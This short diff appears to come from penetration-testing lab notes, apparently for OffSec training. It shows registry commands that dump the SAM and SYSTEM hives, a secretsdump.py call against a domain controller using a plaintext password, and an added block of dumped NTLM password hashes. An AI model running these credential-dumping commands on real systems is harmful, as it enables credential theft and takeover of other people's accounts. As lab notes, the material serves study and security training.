@@ -1013,6 +1013,15 @@ reg save hklm\sam c:\sam
 reg save hklm\system c:\system
 ````
 ````
+cat hashes.sam    
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
+alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
+hacker:1006:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+````
+````
 python3 /home/kali/Downloads/impacket-0.9.20/examples/secretsdump.py 'OFFSEC/Allison:RockYou!@192.168.129.59'
 systeminfo #DC01
 ````
